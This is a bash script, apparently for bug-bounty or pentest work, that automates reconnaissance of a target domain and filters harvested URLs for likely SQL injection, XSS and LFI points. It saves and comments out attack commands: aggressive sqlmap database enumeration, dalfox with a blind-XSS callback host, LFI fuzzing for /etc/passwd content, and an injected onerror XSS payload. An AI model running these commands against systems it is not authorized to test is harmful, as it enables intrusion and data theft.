#!/bin/bash

# ANSI color codes for output styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
LARGE='\e[1m'
RESET='\033[0m'

# Get current working directory and date
current_dir=$(pwd)
current_date=$(date +'%Y-%m-%d')

# Initialize variables with defaults
default_exclude_domain="bit.ly"
exclude_domain=""
run_aquatone=false
run_wafw00f=false
run_nuclei=false
run_dirsearch=false
subdomainThreads=30
dirsearchThreads=30
dirsearchWordlist="/usr/share/dirb/wordlists/common.txt"

# Parse command-line arguments
while getopts ":d:e:aws:n:" opt; do
    case $opt in
        d) target_domain="$OPTARG" ;;
        e) exclude_domain="$OPTARG" ;;
        a) run_aquatone=true ;;
        w) run_wafw00f=true ;;
        s) 
            run_dirsearch=true
            dirsearchWordlist="$OPTARG"
            ;;
        n) run_nuclei=true ;;
        \?) 
            echo -e "${RED}${LARGE}Invalid option: -$OPTARG${RESET}" >&2
            exit 1
            ;;
        :)  
            echo -e "${RED}${LARGE}Option -$OPTARG requires an argument.${RESET}" >&2
            exit 1
            ;;
    esac
done

# Validate required parameters
if [ -z "$target_domain" ]; then
    echo -e "${RED}${LARGE}Usage: $0 -d <target_domain> [-e <exclude_domain>] [-a] [-w] [-s <wordlist_path>] [-n]${RESET}"
    exit 1
fi

# Define and create reconnaissance directory structure
fast_recon_dir="$current_dir/$target_domain/fastRecon__$current_date"
mkdir -p "$fast_recon_dir" "$fast_recon_dir/gf-data" "$fast_recon_dir/subdomains" \
         "$fast_recon_dir/contents" "$fast_recon_dir/nuclei" "$fast_recon_dir/vulns"

# Function to store manual commands
manual_command() {
    echo -e "${YELLOW}${LARGE}Saving manual commands...${RESET}"
    local manual_command="# Additional commands for manual execution
    
# Run nuclei vulnerability scanner
nuclei -l \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/nuclei/nuclei.txt\"

# Check for WAF protection
wafw00f -i \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/wafw00f.txt\"

# Run SQLMap on potential SQL injection points
sqlmap -m \"$fast_recon_dir/gf-data/sqli.urls\" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between

# XSS scanning with dalfox
dalfox -b hahwul.xss.ht file \"$fast_recon_dir/gf-data/xss.urls\"

# LFI testing
cat \"$fast_recon_dir/gf-data/lfi.urls\" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"

  # Save commands to manual_command.txt
  echo "$manual_commands"
    
    echo "$manual_command" > "$fast_recon_dir/manual_command.txt"
    echo -e "${GREEN}${LARGE}Manual commands saved to: $fast_recon_dir/manual_command.txt${RESET}"
}

# Function to run Subfinder
run_subfinder() {
    echo -e "${YELLOW}${LARGE}Running Subfinder...${RESET}"
    subfinder -d "$target_domain" -o "$fast_recon_dir/subdomains/subfinder.txt"
    echo "subfinder -d \"$target_domain\" -o \"$fast_recon_dir/subdomains/subfinder.txt\"" >> "$fast_recon_dir/commands_log.txt"
    echo -e "${GREEN}${LARGE}Subfinder scan completed.${RESET}"
}

# Function to run Assetfinder
run_assetfinder() {
    echo -e "${YELLOW}${LARGE}Running Assetfinder...${RESET}"
    assetfinder "$target_domain" > "$fast_recon_dir/subdomains/assetfinder.txt"
    echo "assetfinder \"$target_domain\" > \"$fast_recon_dir/subdomains/assetfinder.txt\"" >> "$fast_recon_dir/commands_log.txt"
    
    # Combine and sort subdomains
    cat "$fast_recon_dir/subdomains/subfinder.txt" "$fast_recon_dir/subdomains/assetfinder.txt" | \
        sort -u | grep "\.$target_domain" | anew "$fast_recon_dir/subdomains/subdomains.txt"
    echo -e "${GREEN}${LARGE}Assetfinder scanning completed.${RESET}"
}

# Function to run HTTP enumeration with httpx
run_httpx() {
    echo -e "${YELLOW}${LARGE}Running httpx...${RESET}"
    cat "$fast_recon_dir/subdomains/subdomains.txt" | httpx -t 50 -p 80,443,8000,8080,8443 | \
        anew "$fast_recon_dir/httpx.txt"
    echo "cat \"$fast_recon_dir/subdomains/subdomains.txt\" | httpx -t 50 -p 80,443,8000,8080,8443 | anew \"$fast_recon_dir/httpx.txt\"" >> "$fast_recon_dir/commands_log.txt"
    echo -e "${GREEN}${LARGE}HTTP enumeration completed.${RESET}"
}

# Function to run Wayback URLs
run_waybackurls() {
    echo -e "${YELLOW}${LARGE}Running Wayback URLs...${RESET}"
    cat "$fast_recon_dir/httpx.txt" | gau | grep "$target_domain" | anew "$fast_recon_dir/waybackurls.txt"
    echo "cat \"$fast_recon_dir/httpx.txt\" | gau | grep \"$target_domain\" | anew \"$fast_recon_dir/waybackurls.txt\"" >> "$fast_recon_dir/commands_log.txt"
    echo -e "${GREEN}${LARGE}Wayback URLs captured.${RESET}"
}

# Function to run GF (GrepFuzz)
run_grepfuzz() {
    echo -e "${YELLOW}${LARGE}Running GF (GrepFuzz)...${RESET}"
    local patterns=(redirect ssrf ssti idor lfi xss sqli)
    for pattern in "${patterns[@]}"; do
        cat "$fast_recon_dir/waybackurls.txt" | gf "$pattern" | anew "$fast_recon_dir/gf-data/$pattern.urls"
        echo "cat \"$fast_recon_dir/waybackurls.txt\" | gf $pattern | anew \"$fast_recon_dir/gf-data/$pattern.urls\"" >> "$fast_recon_dir/commands_log.txt"
    done
    echo -e "${GREEN}${LARGE}GF (GrepFuzz) completed.${RESET}"
}

# Function to run Aquatone
run_aquatone() {
    if [ "$run_aquatone" = true ]; then
        echo -e "${YELLOW}${LARGE}Running Aquatone...${RESET}"
        cat "$fast_recon_dir/subdomains/subdomains.txt" | aquatone -out "$fast_recon_dir/aquatone"
        echo "cat \"$fast_recon_dir/subdomains/subdomains.txt\" | aquatone -out \"$fast_recon_dir/aquatone\"" >> "$fast_recon_dir/commands_log.txt"
        echo -e "${GREEN}${LARGE}Aquatone completed.${RESET}"
    fi
}

# Function to run Wafw00f
run_wafw00f() {
    if [ "$run_wafw00f" = true ]; then
        echo -e "${YELLOW}${LARGE}Running Wafw00f...${RESET}"
        wafw00f -i "$fast_recon_dir/httpx.txt" -o "$fast_recon_dir/wafw00f.txt"
        echo "wafw00f -i \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/wafw00f.txt\"" >> "$fast_recon_dir/commands_log.txt"
        echo -e "${GREEN}${LARGE}Wafw00f completed.${RESET}"
    fi
}

# Function to run Dirsearch
run_dirsearch() {
    if [ "$run_dirsearch" = true ]; then
        echo -e "${YELLOW}${LARGE}Running Dirsearch...${RESET}"
        cat "$fast_recon_dir/httpx.txt" | xargs -P"$subdomainThreads" -I % sh -c \
            "dirsearch -e php,asp,aspx,jsp,html,zip,jar -w \"$dirsearchWordlist\" -t $dirsearchThreads -r -R 3 --recursion-status 200-399 -u % -o \"$fast_recon_dir/contents/dirsearch.txt\""
        echo "cat \"$fast_recon_dir/httpx.txt\" | xargs -P$subdomainThreads -I % sh -c \"dirsearch ...\"" >> "$fast_recon_dir/commands_log.txt"
        echo -e "${GREEN}${LARGE}Dirsearch completed.${RESET}"
    fi
}

# Function to run Nuclei
run_nuclei() {
    if [ "$run_nuclei" = true ]; then
        echo -e "${YELLOW}${LARGE}Running Nuclei...${RESET}"
        nuclei -l "$fast_recon_dir/httpx.txt" -o "$fast_recon_dir/nuclei/nuclei.txt"
        echo "nuclei -l \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/nuclei/nuclei.txt\"" >> "$fast_recon_dir/commands_log.txt"
        echo -e "${GREEN}${LARGE}Nuclei completed.${RESET}"
    fi
}
#run_vulns{
  #sqlinjection
  #sqlmap -m "$fast_recon_dir/gf-data/sqli.urls" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between  | tee $fast_recon_dir/vulns/sqlmap.txt
 
  #ssrfmap (not good large automation)
  #dotdotpwn(it was only available for one url)
  #lfi
  ##cat  "$fast_recon_dir/gf-data/lfi.urls" | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w /mnt/d/pentest/payloads/lfis.txt ; done
  #XSS
  #dalfox -b hahwul.xss.ht file "$fast_recon_dir/gf-data/xss.urls"
  #cat  "$fast_recon_dir/waybackurls.txt" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a "$fast_recon_dir/vulns/freq_output" | grep -iv "Not Vulnerable" | tee -a "$fast_recon_dir/vulns/freq_xss_findings"
#}


# Function to generate summary report
generate_summary() {
    echo -e "${YELLOW}${LARGE}Generating summary report...${RESET}"
    local summary_file="$fast_recon_dir/recon_summary.txt"
    
    {
        echo "# Reconnaissance Summary for $target_domain - $current_date"
        echo "--------------------------------------------------------"
        
        [ -f "$fast_recon_dir/subdomains/subdomains.txt" ] && \
            echo "Total subdomains discovered: $(wc -l < "$fast_recon_dir/subdomains/subdomains.txt")"
        [ -f "$fast_recon_dir/httpx.txt" ] && \
            echo "Live hosts: $(wc -l < "$fast_recon_dir/httpx.txt")"
        [ -f "$fast_recon_dir/waybackurls.txt" ] && \
            echo "Wayback URLs: $(wc -l < "$fast_recon_dir/waybackurls.txt")"
        
        echo "Potential vulnerabilities detected:"
        for file in "$fast_recon_dir/gf-data"/*.urls; do
            [ -f "$file" ] && echo "  - $(basename "$file"): $(wc -l < "$file")"
        done
        
        [ -f "$fast_recon_dir/nuclei/nuclei.txt" ] && \
            echo "Nuclei findings: $(wc -l < "$fast_recon_dir/nuclei/nuclei.txt")"
        
        echo -e "\nFor detailed commands executed, see: $fast_recon_dir/commands_log.txt"
    } > "$summary_file"
    
    echo -e "${GREEN}${LARGE}Summary report saved at: $summary_file${RESET}"
}

# Execute reconnaissance tasks
manual_command
run_subfinder
run_assetfinder
run_httpx
run_waybackurls
run_grepfuzz
run_aquatone
run_wafw00f
run_dirsearch
run_nuclei
generate_summary

echo -e "${GREEN}${LARGE}Reconnaissance complete. All results saved in: $fast_recon_dir${RESET}"
